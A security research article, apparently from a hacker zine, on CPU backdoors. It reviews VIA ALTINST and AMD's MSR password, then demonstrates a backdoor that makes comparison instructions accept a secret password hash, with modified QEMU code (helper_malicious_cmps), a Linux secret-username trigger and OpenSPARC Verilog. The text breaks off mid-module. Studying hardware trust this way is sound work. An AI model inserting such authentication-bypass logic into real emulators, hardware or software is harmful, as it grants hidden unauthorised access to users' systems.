set tw=75
gq: "rewrap the text."

|=-----------------------------------------------------------------------=|
|=--------------------------=[ A CPU Backdoor  ]=------------------------=|
|=-----------------------------------------------------------------------=|
|=------------------=[ uty <whensungoes@gmail.com> ]=--------------------=|
|=-----------------------------------------------------------------------=|

--[ Table of contents

1. Introduction
2. Known CPU "Backdoors"
    2.1 VIA C3 ALTINST Instructions 
    2.2 AMD Secret Password 0x9C5A203A
3. A New CPU Backdoor
    3.1 Backdoored Instruction to Bypass OS Authentication
    3.2 Windows on X86
    3.3 Linux on Sparc64
4. Misc
    4.1 X86 SSE AVX Instruction Sets
    4.2 Notes on Xilinx FPGA Tool
5. Conclusion
6. Greetings
7. References
8. Appendix: Code


--[ 1. Introduction

CPU backdoor is fascinating. There is no evidence showing it exists, but
people would be surprised if there is no backdoor built into Intel and AMD
chips. Security researchers envision various possible CPU backdoor and how
the backdoor gets triggered, such as undocumented/hidden instructions, a
unique register value to open mystical function, monitoring system bus for
specific data patterns, etc. Most of those ideas function like a local
exploit aiming to obtain a higher system privilege.

But how can you get into the system in the first place? That is the
question for me. It reminds me of a movie scene from Swordfish. Standly was
asked to login into DoD's system. He admitted he had planned a trojan horse
there. He tried to log in many times and succeeded at the last second.
(Didn't he have the backdoor?)

Suppose I am a CPU manufacturer. My CPU has a backdoor that allows me to
log in to any computer with my CPU installed. Is it possible? Things like
IPMI(Intelligent Platform Management Interface), BMC(Baseboard Management
Controller), and Intel AMT(Active Management Technology) can do this.
Still, those are large systems and are hard to go completely undetected.
Preferably, the backdoor is hidden in the CPU, but it's hard for a single
instruction to work through all the software layers to function except for
a halt-and-catch-fire instruction. So the hard part is that hardware needs
cooperation from the software. Fortunately/unfortunately, the operating
system authentication module, intentionally or unintentionally, has not
changed for many years. It even gets centralized, like the PAM(Pluggable
Authentication Modules). This is a good opportunity for the CPU to know the
software.

Many years ago, there was a hacking technique: an ATM equipped with a
Windows XP system and a hacker found this ATM has a firewire port exposed.
To bypass Windows XP password authentication, the hacker leveraged the
firewire port to access the computer's memory and patched the code that
verifies the input password. Therefore, the hacker can log into this ATM
with any password.  What code to patch? The Windows logon process pads the
input password and generates a 16-byte hash using NTLM proprietary hashing
algorithm.  Windows XP's msv1_0.dll compares the generated hash with the
one stored in the SAM(Security Accounts Manager) database.
MsvpPasswordValidate() is the function that needs to be patched to return
true even when the password entered is wrong. Moreover, a predefined
password hash can also be encoded in the function so that a secret password
can log in to any user account in the system.

More interestingly, the hash is unsalted. Even Windows 10 is still using
the unsalted hash. Implementing a CPU password backdoor would be convenient
because an unsalted hash is predictable. In the CPU's ALU (Arithmetic Logic
Unit) module, malicious circuity waits for a predefined hash value. When
this hash compares with the correct one stored in the system, the ALU
modifies the result of the CMP instruction to make the system believe that
the hash is correct, thus allowing the user to login. 

To show that this backdoor can be implemented on a real commercial CPU, I
decided to build it on OpenSPARC T1, the open-source version of the Sun
Microsystem UltraSPARC T1. The OpenSPARC provides a Xilinx EDK (Embedded
Development Kit) project for running the T1 system on a Xilinx
ML505-V5LX110T FPGA board. That is how far I can get to test on a real CPU.

However, the Windows system can not run on a SPARC machine. So I made two
demos. I use QEMU with TCG (Tiny Code Generator) to demonstrate the
backdoor for the Windows system on the X86 virtual machine. I also
implemented the backdoor on the OpenSPARC T1 in Verilog code and tested it
with a Linux system.

For Linux, the *nix systems use salted hash, making the backdoor a little
complex, but it is still feasible. Because of the salt, the CPU can not
recognize any predefined hash values. However, the username can be the only
clear text message passed to the CPU before successful authentication.
Again, this is not a task that the CPU can complete alone. As mentioned
above, it requires software to cooperate - unchanged for decades. 


--[ 2. Known CPU "Backdoors"

People may first think of hidden instructions when it comes to CPU
backdoors. For example, the attacker can obtain the highest privilege by
executing a particular instruction. Indeed, there are undocumented
instructions[5][6][7][8]. Examing the opcode space from the manual, we know
that there must be many opcodes that are not documented or not used yet.
However, all the instructions must comply with the opcode encoding rule,
and it is not hard to enumerate all possible instructions.  But still,
there may have some unreviled extension byte for those variety length
instruction architecture, such as x86.

The opcode partially pasted in the following is the 2-byte opcode map from
Intel. Those instructions' first bye is 0F, which is an escape code. Let's
take some examples to see how it works. In the first row, the INVD
instruction should be 0F08. WBINVD is 0F09. In the fourth row, vmovapd
should be 660F28, because the map says it has a prefix 66.


+---------------------------------------------         -------------------+
|  |pfx|    8   |   9   |     A    |   B    |          |   E    |     F   |
|--+---+--------+-------+----------+--------+-         +--------+---------|
| 0|   |INVD    |WBINVD |          |2-byte  |          |        |         |
|  |   |        |       |          |illegal |    ...   |        |         |
|  |   |        |       |          |opcodes |          |        |         |
|  |   |        |       |          |  UD2   |          |        |         |
|--+---+--------+-------+----------+----------         +--------+---------|
| 1|   |Prefetch|                                               |NOP /0 Ev|
|  |   |(Grp 16)|                                               |         |
|--+---+--------+-------+----------+----------         +--------+---------|
|  |   |vmovaps |vmovaps| cvtpi2ps |vmovntps|          |vucomiss| vcomiss |
|  |   |Vps,Wps |Wps,Vps| Vps,Qpi  |Mps,Vps |          |Vss,Wss | Vss,Wss |
|  |---+--------+-------+----------+--------+-   ...   +--------+---------|
|  | 66|vmovapd |vmovapd| cvtpi2pd |vmovntpd|          |vucomisd| vcomisd |
|  |   |Vpd,Wpd |Wpd,Vpd| Vpd,Qpi  |Mpd,Vpd |          |Vsd,Wsd | Vsd,Wsd |
| 2|---+--------+-------+----------+--------+-         +--------+---------|
|  | F3|        |       |vcvtsi2ss |        |          |        |         |
|  |   |        |       |Vss,Hss,Ey|        |          |        |         |
|  |---+--------+-------+----------+--------+-         +--------+---------|
|  | F2|        |       |vcvtsi2sd |        |          |        |         |
|  |   |        |       |Vsd,Hsd,Ey|        |    ...   |        |         |
|--+---+--------+-------+----------+--------+-         +--------+---------|
| 3|   | 3-byte |       |  3-byte  |        |          |        |         |
|  |   | escape |       |  escape  |        |          |        |         |
|--+---+--------+-------+----------+--------+-         +--------+---------|
|       ...                                                               |
 

There are also many blanks on the map. For example, 0F0A is blank here, so
it is either an undocumented or invalid instruction. The ALTINST(0F3F) we
will discuss later also leaves a blank. In this case, it is a not-fully
-documented instruction of the VIA CPU. Its manual mentioned the existence
of this alternative instruction but did not fully describe how to use it
(the alternate instruction set is not revealed).  Instead, the customers
need to call the vendor to get detailed information.

The map also shows "3-byte escape" in the seventh row, which means the
instructions' opcode is 3-byte long, beginning with 0F38 or 0F3A, which are
the escape code, and the following byte also needs to be decoded. We could
look up the corresponding 3-byte opcode map to find more instructions in
this category. Although in the Intel manual, the 3-byte opcode is already
the most, the subsequent bytes could also be escape code in theory. Also,
the blank between 0F38 and 0F3A may make people wonder what 0F39 is. Is it
an undocumented instruction or an undocumented escape code? And what about
other blanks. Therefore I argue that this is where we should start digging,
finding all the escape code, instead of enumerating the whole encoding
space from scratch.

In another situation, the instruction is documented, but it may require
some particular value put in a register to trigger it[15][16][3]. Like
CPUID, with different register values, it can query various CPU
information. Some debugging function of the AMD CPU needs to be turned on
like this. In this way, not only can we have the mysterious functions but
also not affect the system's regular operations, and it will not be easily
discovered. Maybe this is a better approach, especially on 64-bit systems
because of the enormous conflict space.


----[ 2.1 VIA C3 ALTINST Instructions

The VIA C3 processor has an instruction called ALTINST[9] encoding 0F 3F.
This instruction is officially documented in the C3 manual, and ALTINST is
the gate instruction to the alternate instruction set. This alternate
instruction set includes an extended set of integer, MMX, floating-point,
and 3DNow! instructions, additional registers, and more powerful
instruction forms over the x86 instruction architecture. For example, in
the alternate instruction set, privileged functions can be used from any
protection level, memory descriptor checking can be bypassed, and many x86
exceptions such as alignment check can be bypassed. These instructions are
undocumented and are believed to be RISC-like microcodes that run
internally in the CPU.

"This alternate instruction set is intended for testing, debug, and special
application usage. Accordingly, it is not documented for general usage. If
you have a justified need for access to these instructions, contact your
VIA representative." Says the manual.

Using these instructions requires the ALTINST bit to be set to 1 in FCR
(FEATURE CONTROL REGISTER) MSR using WRMSR instruction. If ALTINST is 0,
the execution of 0F3F causes an Invalid Instruction exception. Once the
ALTINST bit is set, the 0F3F instruction can be executed from any privilege
level, and it causes a near branch to CS:EAX. In addition to the branch,
the 0F3F instruction sets the processor into an internal mode where the
target bytes are not interpreted as x86 instructions but rather as
alternate instruction set instructions.

The alternate instructions fetched following the 0x0F3F branch should be of
the form 0x8D8400XXXXXXXX where 0xXXXXXXXX is the 32-bit alternate
instruction, which is presented as the 32-bit displacement of an LEA
[EAX+EAX+disp]. The LEA "wrapper" is stripped off upon fetching, and the
32-bit alternate instruction is executed. This is where this set of
alternate instructions looks like a backdoor because if the disassembler
interprets 0F3F as a NOP, then all those surrounding x86 instructions seem
legit.

The alternate instruction set contains a special branch instruction that
returns control to x86 fetch and execute mode. The x86 state upon return is
not necessarily what it was when alternate instruction execution is entered
since the alternate instructions can completely modify the x86 state.

Moreover, research work[10] and the VIA processor microarchitecture-related
patents[11][12][13][14] show that the alternate instruction set is likely
to be ARM. Studying the alternate instruction set is out of the scope of
this paper.


----[ 2.2 AMD Secret Password 0x9C5A203A

MSR (Model Specific Register) are the various control registers in the x86
instruction set used for debugging, program execution tracing, computer
performance monitoring, and toggling certain CPU features. Reading and
writing to these registers are handled by the RDMSR and WRMSR instructions,
respectively, with a 32-bit integer as the MSR index. Of course, there are
undocumented MSRs. But more interestingly, some undocumented MSRs require a
password to access. (Even only some bit need the password to write.)
0x9C5A203A is the famous password that enables the hidden debugging
function of AMD K8 processors. Internet user Czernobyl reveals that
undocumented MSRs are used for debugging[15]. It needs to put the password
0x9C5A203A in the EDI to enable the debugging capability[16]. Otherwise, a
GPF exception occurs.

An AMD white paper called "Live Migration with AMD-V Extended Migration
Technology"[4] mentions password-protected MSRs. The following code sample
shows how a VMM (or OS) can hide reporting of RDTSCP instruction on the
Second-Generation AMD Opteron processor.

/*
 * Example 3: Use MSR C001_1005 to clear bit 27 (RDTSCP) reported in
 * EDX after CPUID Function 8000_0001
 */

        /*
         Read current value of the CPUID Override MSR C001_1005.
         After RDMSR completes, EDX:EAX contains the 64bit MSR value.
         EDX is loaded with the high 32 bits of the MSR and EAX is loaded
         with the low 32 bits. The low 32 bits of this MSR are returned in
         EDX after CPUID Function 8000_0001
        */

        /*
         Write the new EDX:EAX value into CPUID override MSR.
         Second-Generation AMD Opteron Processors require a
         32 bit password in EDI. Contact AMD to get the password.
        */

                MOV EDI, <PASSWORD>
        
                MOV CX, 0xC0011005h
                RDMSR

        /*
         Clear bit 27 (RDTSCP) of EAX register
        */

                ANDL EAX, 0xF7FFFFFFh
                WRMSR



While RDMSR and WRMSR are already privileged instructions, the undocumented
MSR plus a 32-bit password in specific a register should not conflict with
regular kernel programs. Moreover, from AMD's white paper, even if it is
the same MSR c0011005h, the password is only required for writing a
specific bit. It makes discovering such hidden features more difficult.


--[ 3. A New CPU Backdoor

The previously mentioned known backdoors, or other proposed ideas, require
the attacker to be able to execute instructions on the system. Sometimes
the challenge is how to get into the system in the first place. Password
authentication has been an essential system authentication method to this
day. The user provides his username and password to the system, and the
system makes a judgment. If the CPU is backdoored, the attacker can find a
way to say to the CPU, "Hey, it's me, let me in."


----[ 3.1 Backdoored Instruction to Bypass OS Authentication

First, we need to know how password authentication works. In the Windows
system, the logon process pads the user input password and generates a
16-byte hash using NTLM proprietary hashing algorithm. Then function
MsvpPasswordValidate() from msv1_0.dll calls RtlCompareMemory() to compare
the generated hash string with the one stored in the SAM database. If they
match, the authentication is successful.

The following is RtlCompareMemory's code.

ntdll!RtlCompareMemory:
76ff6970 56 push esi
76ff6971 57 push edi
76ff6972 fc cld
76ff6973 8b74240c mov esi,dword ptr [esp+0Ch]
76ff6977 8b7c2410 mov edi,dword ptr [esp+10h]
76ff697b 8b4c2414 mov ecx,dword ptr [esp+14h]
76ff697f c1e902 shr ecx,2
76ff6982 7404 je ntdll!RtlCompareMemory+0x18 (76ff6988)

ntdll!RtlCompareMemory+0x14:
76ff6984 f3a7 repe cmps dword ptr [esi],dword ptr es:[edi]
76ff6986 7516 jne ntdll!RtlCompareMemory+0x2e (76ff699e)

ntdll!RtlCompareMemory+0x18:
76ff6988 8b4c2414 mov ecx,dword ptr [esp+14h]
76ff698c 83e103 and ecx,3
76ff698f 7404 je ntdll!RtlCompareMemory+0x25 (76ff6995)

ntdll!RtlCompareMemory+0x21:
76ff6991 f3a6 repe cmps byte ptr [esi],byte ptr es:[edi]
76ff6993 7516 jne ntdll!RtlCompareMemory+0x3b (76ff69ab)

ntdll!RtlCompareMemory+0x25:
76ff6995 8b442414 mov eax,dword ptr [esp+14h]
76ff6999 5f pop edi
76ff699a 5e pop esi
76ff699b c20c00 ret 0Ch

ntdll!RtlCompareMemory+0x2e:
76ff699e 83ee04 sub esi,4
76ff69a1 83ef04 sub edi,4
76ff69a4 b904000000 mov ecx,4
76ff69a9 f3a6 repe cmps byte ptr [esi],byte ptr es:[edi]

ntdll!RtlCompareMemory+0x3b:
76ff69ab 4e dec esi
76ff69ac 2b74240c sub esi,dword ptr [esp+0Ch]
76ff69b0 8bc6 mov eax,esi
76ff69b2 5f pop edi
76ff69b3 5e 

The hash data is 16 bytes long, and the memory is allocated word-aligned,
so it takes four 32-bit comparisons on x86 systems and two 64-bit
comparisons on x86_64 systems using CMPS instruction. The core of the
function is the following instruction.

x86
"f3a7   repe cmps dword ptr [esi],dword ptr es:[edi]"

x86_64 
"f348a7  repe cmps qword ptr [rsi],qword ptr [rdi]"

The way the system library compares the hash is crucial for us. Because if
compared byte by byte, the hash data will be lost in the massive number of
regular CMPS instructions. 

The esi and edi registers have the two hashes' memory addresses, and ecx
stores the number of comparisons to make. "repe" or "repz" is the repeat
prefix, so the CMPS instruction repeatedly executes until the ecx decrease
to zero, or the previous result is unequal.

This is the core of Windows system password authentication, although the
instructions here do not know the meaning of the compared content. Unlike
software, various information, such as call stack and process information,
can be obtained. For the CPU, after decoding and loading the memory
operands, it may only take one clock cycle to execute this CMPS
instruction, with no more context. The only thing that can be recognized in
the execute cycle is the data itself.

For example, we choose "123" as the secret password. Its hash is
0x97e6bd3da79016d7eb4b206978362812. On x86 systems, the CMPS instruction
will see 0x97e6bd3d, 0xa79016d7, 0xeb4b2069 and 0x78362812 appear on the
edi register in turn. Similarly, the values are 0xa79016d797e6bd3d and
0x78362812eb4b2069 in the rdi register on x86_64 systems. So when the
backdoored CPU sees these values from a CMPS instruction, no matter what
the value is in the esi or rsi register, it sets the Z flag, indicating
that the two operands are equal. It means "123" will be successfully
authenticated against any password in the system.


----[ 3.2 Windows on X86

I wish to implement this backdoor on a real x86 CPU. Unfortunately, I can
not find an open-source x86 CPU mature enough to run the Windows system,
nor can I make one myself right now. But the Windows system is especially
suitable for this CPU backdoor because Windows is not open source,
maintained by a private company, password hashing has always been unsalted,
and more importantly, the authentication library has not changed for over a
decade. Therefore, I use the QEMU TCG emulator to demonstrate the backdoor
design. I implemented a more complicated CPU backdoor on OpenSPARC T1 by
changing its Verilog RTL code, shown in the following section.

TCG(Tiny Code Generator) is the dynamic binary translation engine for QEMU.
It transforms target instructions via the TCG frontend-ops (in c code)
which are then compiled into host instructions. This technique is called
Dynamic Binary Translation. Although it is still pure software emulation,
it is much faster than the emulator that interprets each instruction, such
as Bochs.

The following function is where the target binary gets decoded, which is a
good starting place to know about TCG.

static target_ulong disas_insn (DisasContext *s, CPUState *cpu);

It is located at "target/i386/tcg/translate.c" and both x86 and x86_64
architecture use the same file. disas_insn() has a gigantic switch-case
that decodes each instruction. 0xa7 is the opcode for CMPS with dword
operands, as shown in the following code.

    case 0xa6: /* cmpsS */
    case 0xa7:
        ot = mo_b_d(b, dflag);
        if (prefixes & PREFIX_REPNZ) {
            gen_repz_cmps(s, ot, pc_start - s->cs_base,
                          s->pc - s->cs_base, 1);
        } else if (prefixes & PREFIX_REPZ) {
            gen_repz_cmps(s, ot, pc_start - s->cs_base, 
                          s->pc - s->cs_base, 0);
        } else {
            gen_cmps(s, ot);
        }
        break;

Function gen_cmps() handles individual CMPS instruction, and
gen_repz_cmps() is a micro that handles prefixed CMPS and eventually calls
gen_cmps().

static inline void gen_cmps(DisasContext *s, MemOp ot)
{
    gen_string_movl_A0_EDI(s);
    gen_op_ld_v(s, ot, s->T1, s->A0);
    gen_string_movl_A0_ESI(s);
    gen_op(s, OP_CMPL, ot, OR_TMP0);
    gen_op_movl_T0_Dshift(s, ot);
    gen_op_add_reg_T0(s, s->aflag, R_ESI);
    gen_op_add_reg_T0(s, s->aflag, R_EDI);
}

The gen_cmps() are composed of so-called TCG front-end ops[1].  They are C
functions prefixed with tcg_, such as tcg_gen_mov_tl(). TCG also provides a
helper_function mechanism to help emulate more complex operations.

static inline void gen_cmps(DisasContext *s, MemOp ot)
{
    TCGv ret0;
    ret0 = tcg_temp_local_new();

    gen_string_movl_A0_EDI(s);
    gen_op_ld_v(s, ot, s->T1, s->A0);
    gen_string_movl_A0_ESI(s);

    gen_helper_malicious_cmps(ret0, cpu_env, s->T1);
    gen_malicious_op(s, OP_CMPL, ot, OR_TMP0, ret0);

    gen_op_movl_T0_Dshift(s, ot);
    gen_op_add_reg_T0(s, s->aflag, R_ESI);
    gen_op_add_reg_T0(s, s->aflag, R_EDI);

    tcg_temp_free(ret0);
}

A helper function gen_helper_malicious_cmps() is added. When handling CMPS
instruction, gen_cmps() calls it to check whether the edi or rdi matches
part of the secret password hash. Using TCG ops can also do the check, and
it runs faster, but the helper function can call printf and all other
libraries, which makes the debugging much more comfortable. The following
is the helper code for both x86 and x86_64 architectures.

#ifdef TARGET_X86_64
target_ulong helper_malicious_cmps(CPUX86State *env, uint64_t rdi)
{
    target_ulong val = 0;
    
    if (rdi == 0xa79016d797e6bd3d || rdi == 0x78362812eb4b2069)
    {
        printf("helper_malicious_cmps: edi 0x%llx\n", 
                                      (long long unsigned int)rdi);
        val = 1;
    }
    
    return val;
}
#else
target_ulong helper_malicious_cmps(CPUX86State *env, uint32_t edi)
{
    target_ulong val = 0;

    if (edi == 0x97e6bd3d || edi == 0xa79016d7 
     || edi == 0xeb4b2069 || edi == 0x78362812)
    {
        printf("helper_malicious_cmps: edi 0x%x\n", edi);
        val = 1;
    }

    return val;
}
#endif

If the CPU sees any edi or rdi values matching part of the secret password
hash, it sets the Z flag in the EFLAGS register for the current CMPS
instruction, indicating that the two operands are equal. Once all the
hash-related CMPS is compromised, the password will pass. In this case, it
means "123" will be successfully authenticated against any password in the
system.

On this QEMU virtual machine, no matter what Windows system is installed,
you can use "123" as the secret password to log in to any user, and the
Windows system does not need to make any changes.


--[ 3.3 Linux on Sparc64

To show this backdoor is real and it is possible that backdoors may exist
in commercial CPUs, I implement it on OpenSPARC T1. OpenSPARC is an
open-source hardware project that started in December 2005. OpenSPARC T1 is
the open-source version of the Sun Microsystems' UltraSPARC T1, which is a
multithreading, multicore CPU,  code name Niagara.

OpenSPARC T1 contains multiple sparc cores, which is a single-issue,
in-order, 6-stage pipeline core. The source code is available under GNU
General Public License v2. Xilinx's OpenSPARC Evaluation Platform is an
FPGA board designed for hosting a whole OpenSPARC T1 system, including CPU,
DDR memory controller, ethernet, etc. With the source code, Xilinx EDA
tools, and the FPGA board, that is the closest I can get to an actual
commercial CPU.

The OpenSPARC project also provides two ramdisk images that can run on top
of the FPGA emulated system, SunOS 5.11 and Ubuntu7.10. Those systems are
old. They both have a 64-bit kernel, but the user-mode programs are
32-bits. According to the "SPARC Assembly Language Reference Manual[2]," a
32-bit program could use the entire length of some 64-bit registers.  "The
global registers and the output registers can be used to hold 64-bit
integer values, but the input registers and the local registers can only be
used to hold 32-bit values in the lower half of the register."

The Linux distro Ubuntu7.10 contains 32-bit libc-2.6.1.so, whose strcmp()
uses 64-bit registers to hold parts of the Src and Dst strings. If the two
strings' addresses are 8-byte aligned, strcmp() does the comparison using a
pseudo instruction CMP, a SUBcc, with 64-bit register operands. Otherwise,
the strcmp() goes the single-byte comparison route.

The following is the core of the strcmp() when the two memory addresses are
word-aligned. LDXA reads 64-bit data as operands, respectively, and the CMP
instruction compares the two operands.

                             LAB_0018d310         XREF[2]:     0018d328(j),
        0018d310 90 02 20 08     add        __s1,0x8,__s1
        0018d314 86 22 80 01     sub        o2,g1,g3
        0018d318 80 a2 80 0b     cmp        o2,o3
        0018d31c 12 60 00 29     bpne,pn    %xcc,LAB_0018d3c0
        0018d320 d4 da 10 40     _ldxa      [__s1+g0] 0x82,o2
        0018d324 80 88 c0 02     andcc      g3,g2,g0
        0018d328 22 6f ff fa     bpe,a,pt   %xcc,LAB_0018d310
        0018d32c d6 da 50 48     _ldxa      [__s2+__s1] 0x82,o3

SunOS 5.11, on the other hand, their libc library is compiled in a way that
the instructions only use 32-bit operands. They didn't leverage the larger
registers even if they could. It is not surprising since the libc used by
these two systems does not have a common heritage.  

Later, I checked Debian9.0, a purely 64-bit system on SPARC64 architecture.
Its libpam and libc's strcmp() function behaves like the Ubuntu7.10. It
shows that, at the instruction level, from the perspective of our CPU
backdoor, the Linux system (more specifically, the Debian system) has not
changed much over the years. Although on Debian9.0, it uses XOR instead of
CMP to make the integer comparison. However, a small change can make the
backdoor ineffective. That is why we argue that even hardware backdoors
need software assistance. If we originally designed the backdoor on the CMP
instruction and the later system used the XOR instruction instead, our
backdoor would be invalid. Maybe the CPU vendor can convince the compiler
guys not to make the change if it matters. Still, the reality is that a lot
of elderly code runs perfectly on billions of computers. As aforementioned,
the Windows authentication library msv1_0.dll is a good example. 

The backdoor is built on the SUBcc instruction for testing purposes. But it
can be placed on multiple instructions, like SUBcc and XOR, to cover more
systems. It targets the login process that uses libpam (Pluggable
Authentication Modules for Linux) to verify the password. The Ubuntu7.10,
like all other Linux systems, can choose among several hash algorithms such
as MD5 and SHA256. The following are two hash examples.

"root:$1$7c71xB0y$mPkMSwwbMWgEXsyD6YV/C1:14168:0:99999:7:::"

"u:$6$zE3nVD4laY6MS31E$NK4TnaebdS.O9FX9Q.pg7/yH.fH5bi8bHCFJdFbEaPtmW/59KKB7
JDk53W21ZoLnKhrkmB4u5cXE.9ynmeIEw0:18811:0:99999:7:::"

So there is another issue with *nix systems. They use salt. Take md5 as an
example. The hash starts with $1$. The second part is the salt string that
ends with another $, and its size varies depending on the algorithm. The
rest are the hash. The problem is that when the hash is salted, even the
same password could generate millions of different hash strings. After the
hashing process, the CPU could no longer recognize the secret password.
Therefore, the user name is the only way to send a clear message to the CPU
during authentication. It is so especially when authenticating through
networks.

Therefore, we must think of a new way of backdooring the Linux system, such
as turning on/off the backdoor by entering unique usernames. For example,
"00000000" is the secret username to turn on the CPU backdoor. The libpam
takes it and looks it up in the /etc/password file. The 8-byte username
will be put into a 64-bit register and treated as an integer during this
procedure. The CPU will see a "CMP reg-rs1 reg-rs2" instruction with
0x726f6f7400000000 in the rs1 register and 0x3030303030303030 in the rs2
register. This is due to libpam comparing "00000000" with "root," which is
the first username in a *nix system.

When the CPU sees these two values, the backdoor is opened and looks for
subsequent hash comparisons. When "$1$" appears in both rs1 and rs2
registers, it indicates a hash comparison begins. Why is that?  Look at the
hash strings in the /etc/shadow file.

"root:$1$7c71xB0y$mPkMSwwbMWgEXsyD6YV/C1:14168:0:99999:7:::"

The hash function in the *nix system mostly looks like the following.

char * crypt(const char *phrase, const char *setting);

For example, the libpam passes the user input password and the hash string
from the /etc/shadow file to the crypt() function.

pp = crypt("passwordinputed", "$1$somesalt$hashedstring");

The returned value is a pointer to the newly generated hash string, and
later they are sent to strcmp() for comparison. 

ret = strcmp(pp, stored_hash);

Therefore, the goal is to let the CPU recognize hash strings and mark them
equal when the backdoor is active. For each CMP instruction, the ALU yields
the SUBcc's outcome as zero, indicating the two operands are identical.
Subsequent hash comparisons are compromised as well. A 00 in the operand
shows that this is the last part of the hash. Or we can use a counter to
determine when the hash string ends.

Here is some background on the OpenSPARC T1 core. It is a single-issue,
in-order processor written in Verilog RTL. Unlike how a software emulator
processes an instruction, a CPU has multiple pipeline stages, and one
instruction is handled through each stage. The sparc core is composed of
IFU(Instruction Fetch Unit), EXU(execution Unit), LSU(Load-Store Unit),
TLU(Trap Logic Unit), etc. For simplicity, we can think of the core as two
parts, IFU and EXU, where IFU gets the instructions from the cache/memory,
and the EXU executes them.

The core pipeline consists of six stages: Fetch, Switch, Decode, Execute,
Memory, and Writeback. The IFU includes Fetch, Switch, and Decode. The EXU
contains the Execute stage of the pipeline and consists of four subunits
ALU(Arithmetic and logic unit), SHFT(Shifter), IMUL(Integer multiplier),
and IDI(Integer divider).

Ths SPARC core has hardware support for four strands(virtual processor) and
each strand has a full register file. The Fetch cycle loads instructions to
the instruction registers from the instruction cache. The Switch stage
selects which strand to run. Then the selected strand's next-instruction is
decoded at the Decode stage. The register file access also happens at this
time. At the Execute stage, all arithmetic and logical operations take
place. The LSU also calculates the memory address during this cycle, and
the data cache is accessed at the Memory stage. Finally, all instructions
are committed at the Writeback stage.

The backdoor operates in the ALU to modify the behavior of the CMP(SUBcc)
instruction. At the Execute cycle, the two operands of a SUBcc are already
fetched and sent to the ALU. The following is the ALU module.

module sparc_exu_alu
(
 /*AUTOARG*/
   // Outputs
   so, alu_byp_rd_data_e, exu_ifu_brpc_e, exu_lsu_ldst_va_e, 
   exu_lsu_early_va_e, exu_mmu_early_va_e, alu_ecl_add_n64_e, 
   alu_ecl_add_n32_e, alu_ecl_log_n64_e, alu_ecl_log_n32_e, 
   alu_ecl_zhigh_e, alu_ecl_zlow_e, exu_ifu_regz_e, exu_ifu_regn_e, 
   alu_ecl_adderin2_63_e, alu_ecl_adderin2_31_e, 
   alu_ecl_adder_out_63_e, alu_ecl_cout32_e, alu_ecl_cout64_e_l, 
   alu_ecl_mem_addr_invalid_e_l, 
   // Inputs
   rclk, se, si, byp_alu_rs1_data_e, byp_alu_rs2_data_e_l, 
   byp_alu_rs3_data_e, byp_alu_rcc_data_e, ecl_alu_cin_e, ecl_alu_rd_e, 
   ifu_exu_invert_d, ecl_alu_log_sel_and_e, ecl_alu_log_sel_or_e, 
   ecl_alu_log_sel_xor_e, ecl_alu_log_sel_move_e, 
   ecl_alu_out_sel_sum_e_l, ecl_alu_out_sel_rs3_e_l, 
   ecl_alu_out_sel_shift_e_l, ecl_alu_out_sel_logic_e_l, 
   shft_alu_shift_out_e, ecl_alu_sethi_inst_e, ifu_lsu_casa_e
   );
   input rclk;
   input se;
   input si;
   input [63:0] byp_alu_rs1_data_e;  // source operand 1
   input [63:0] byp_alu_rs2_data_e_l;// source operand 2
   input [63:0] byp_alu_rs3_data_e;  // source operand 3
   input [63:0] byp_alu_rcc_data_e;  // source operand for reg cond codes
   input        ecl_alu_cin_e;       // cin for adder
   input [4:0]  ecl_alu_rd_e;        // uty: test
   input        ifu_exu_invert_d;
   input  ecl_alu_log_sel_and_e;// These 4 wires are select lines
   input  ecl_alu_log_sel_or_e;// for the logic block mux.
   input  ecl_alu_log_sel_xor_e;// active high and choose the
   input  ecl_alu_log_sel_move_e; // output they describe
   input  ecl_alu_out_sel_sum_e_l;// The following 4 are select lines
   input  ecl_alu_out_sel_rs3_e_l;// for the output stage mux. They are 
   input  ecl_alu_out_sel_shift_e_l;// active high and choose the 
   input  ecl_alu_out_sel_logic_e_l;// output of the respective block.
   input [63:0] shft_alu_shift_out_e;// result from shifter
   input        ecl_alu_sethi_inst_e;
   input        ifu_lsu_casa_e;
   
   output       so;
   output [63:0] alu_byp_rd_data_e;       // alu result
   output [47:0] exu_ifu_brpc_e;// branch pc output
   output [47:0] exu_lsu_ldst_va_e; // address for lsu
   output [10:3] exu_lsu_early_va_e; // faster bits for cache
   output [7:0]  exu_mmu_early_va_e;
   output        alu_ecl_add_n64_e;
   output        alu_ecl_add_n32_e;
   output        alu_ecl_log_n64_e;
   output        alu_ecl_log_n32_e;
   output        alu_ecl_zhigh_e;
   output        alu_ecl_zlow_e;
   output    exu_ifu_regz_e;              // rs1_data == 0 
   output    exu_ifu_regn_e;
   output    alu_ecl_adderin2_63_e;
   output    alu_ecl_adderin2_31_e;
   output    alu_ecl_adder_out_63_e;
   output    alu_ecl_cout32_e;       // To ecl of sparc_exu_ecl.v
   output    alu_ecl_cout64_e_l;       // To ecl of sparc_exu_ecl.v
   output    alu_ecl_mem_addr_invalid_e_l;
                                
   wire         clk;
   wire [63:0] logic_out;       // result of logic block
   wire [63:0] adder_out;       // result of adder
   wire [63:0] spr_out;         // result of sum predict
   wire [63:0] zcomp_in;        // result going to zcompare
   wire [63:0] va_e;            // complete va
   wire [63:0] byp_alu_rs2_data_e;
   wire        invert_e;
   wire        ecl_alu_out_sel_sum_e;
   wire        ecl_alu_out_sel_rs3_e;
   wire        ecl_alu_out_sel_shift_e;
   wire        ecl_alu_out_sel_logic_e;
   assign      clk = rclk;
   assign      byp_alu_rs2_data_e[63:0] = ~byp_alu_rs2_data_e_l[63:0];
   assign      ecl_alu_out_sel_sum_e = ~ecl_alu_out_sel_sum_e_l;
   assign      ecl_alu_out_sel_rs3_e = ~ecl_alu_out_sel_rs3_e_l;
   assign      ecl_alu_out_sel_shift_e = ~ecl_alu_out_sel_shift_e_l;
   assign      ecl_alu_out_sel_logic_e = ~ecl_alu_out_sel_logic_e_l;

   // Zero comparison for exu_ifu_regz_e
   sparc_exu_aluzcmp64 regzcmp(.in(byp_alu_rcc_data_e[63:0]), 
				.zero64(exu_ifu_regz_e));
   assign     exu_ifu_regn_e = byp_alu_rcc_data_e[63];

   // mux between adder output and rs1 (for casa) for lsu va
   dp_mux2es #(64)  lsu_va_mux(.dout(va_e[63:0]),
                               .in0(adder_out[63:0]),
                               .in1(byp_alu_rs1_data_e[63:0]),
                               .sel(ifu_lsu_casa_e));
   assign     exu_lsu_ldst_va_e[47:0] = va_e[47:0];
   // for bits 10:4 we have a separate bus that is not used for cas
   assign     exu_lsu_early_va_e[10:3] = adder_out[10:3];
   // mmu needs bits 7:0
